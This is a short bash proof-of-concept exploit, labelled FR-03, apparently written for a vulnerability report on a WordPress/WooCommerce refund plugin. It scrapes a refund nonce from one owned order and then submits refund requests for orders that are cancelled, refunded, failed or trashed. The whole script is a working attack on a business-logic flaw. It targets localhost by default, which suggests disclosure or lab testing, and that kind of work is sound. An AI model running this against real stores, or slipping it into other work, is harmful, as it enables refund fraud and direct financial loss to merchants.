#!/usr/bin/env bash
# FR-03 — refund request accepted on a cancelled/refunded/failed/trashed order (free build).
set -euo pipefail
TARGET=${TARGET:-http://localhost:8088}
COOKIES=${COOKIES:-attacker.cookies}     # the order owner's cookies
OWN_ORDER=${OWN_ORDER:-11}               # any owned order, to mint the nonce
CANCELLED_ORDER=${CANCELLED_ORDER:-13}   # an owned order in wc-cancelled (or refunded/failed/trash)
ITEM=${ITEM:-3}                          # a line-item id of CANCELLED_ORDER
NONCE=$(curl -s -b "$COOKIES" "$TARGET/my-account/fr-refund/$OWN_ORDER/?form_id=1" \
  | grep -oE 'fr_refund_request\]" value="[a-f0-9]+"' | grep -oE '[a-f0-9]+"$' | tr -d '"')
curl -s -b "$COOKIES" -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' \
  "$TARGET/my-account/fr-refund/$CANCELLED_ORDER/?form_id=1" \
  --data-urlencode "fr_refund_form[items][$ITEM][qty]=1" \
  --data-urlencode "fr_refund_form[form_id]=1" \
  --data-urlencode "fr_refund_form[fr_refund_request]=$NONCE"
